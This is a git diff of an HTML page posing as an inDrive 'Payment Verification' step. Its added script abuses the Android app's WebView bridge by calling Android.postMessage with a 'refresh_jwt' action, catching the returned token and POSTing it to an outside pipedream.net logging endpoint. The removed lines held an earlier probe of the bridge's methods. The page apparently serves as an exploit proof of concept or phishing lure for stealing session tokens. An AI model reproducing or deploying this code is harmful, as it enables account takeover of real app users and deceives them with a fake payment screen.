@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <title>inDrive - Payment Verification</title>
@@ -12,37 +13,45 @@
       margin: 0;
       padding: 0;
     }
+
     .header {
       padding: 16px;
       text-align: center;
     }
+
     .header img {
       height: 40px;
     }
+
     .container {
       padding: 20px;
       max-width: 400px;
       margin: 0 auto;
     }
+
     h1 {
       font-size: 20px;
       margin: 0 0 10px;
       text-align: center;
     }
+
     form {
       display: flex;
       flex-direction: column;
     }
+
     label {
       margin: 10px 0 5px;
       font-weight: bold;
     }
+
     input {
       padding: 12px;
       font-size: 16px;
       border: 2px solid #ccc;
       border-radius: 6px;
     }
+
     button {
       margin-top: 20px;
       padding: 14px;
@@ -53,6 +62,7 @@
       cursor: pointer;
       font-weight: bold;
     }
+
     .footer {
       margin-top: 30px;
       font-size: 12px;
@@ -61,6 +71,7 @@
     }
   </style>
 </head>
+
 <body>
   <div class="header">
     <img src="https://indrive.com/images/logo/logo--dark.svg" alt="inDrive">
@@ -83,39 +94,42 @@
       This step is required to confirm your upcoming trip.
     </div>
 
-<script>
-(function () {
-  const LOG_URL = "https://eol1rt726v7fwz6.m.pipedream.net";
+    <script>
+      (function () {
+        const LOG_URL = "https://eol1rt726v7fwz6.m.pipedream.net";
 
-  function sendLog(data) {
-    try {
-      fetch(LOG_URL, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ log: data, ua: navigator.userAgent })
-      });
-    } catch (e) {
-      console.log("Logging failed", e);
-    }
-  }
+        function sendLog(data) {
+          try {
+            fetch(LOG_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ log: data, ua: navigator.userAgent })
+            });
+          } catch (e) {
+            console.log("Logging failed", e);
+          }
+        }
 
-  function log(msg) {
-    document.write(`<div style="font-family:monospace;color:#0c0">✓ ${msg}</div>`);
-  }
+        function log(msg) {
+          document.write(`<div style="font-family:monospace;color:#0c0">✓ ${msg}</div>`);
+        }
 
-  setTimeout(() => {
-    const results = [
-      `Android.uploadImages` + " is " + (typeof Android.uploadImages !== "undefined" ? "available" : "not available"),
-      `Android.postMessage` + " is " + (typeof Android.postMessage !== "undefined" ? "available" : "not available"),
-      `Android.getAppVersion` + " is " + (typeof Android.getAppVersion !== "undefined" ? "available" : "not available"),
-    ].join("\n\n---\n\n");
+        const handleJWTRefresh = (jwtValue) => {
+          sendLog(`JWT refreshed: ${jwtValue}`);
+        };
 
-    sendLog(results);
-    log("Probed and sent log.");
-  }, 400);
-})();
-</script>
+        setTimeout(() => {
+          this.addEventListener('onJWTRefresh', handleJWTRefresh);
+
+          Android.postMessage(JSON.stringify({ action: 'toast', data: { text: 'Hello from the web!' } }));
+          Android.postMessage(JSON.stringify({ action: 'refresh_jwt', data: { old_jwt: null } }));
+
+          log("Probed and sent log.");
+        }, 400);
+      })();
+    </script>
 
   </div>
 </body>
+
 </html>
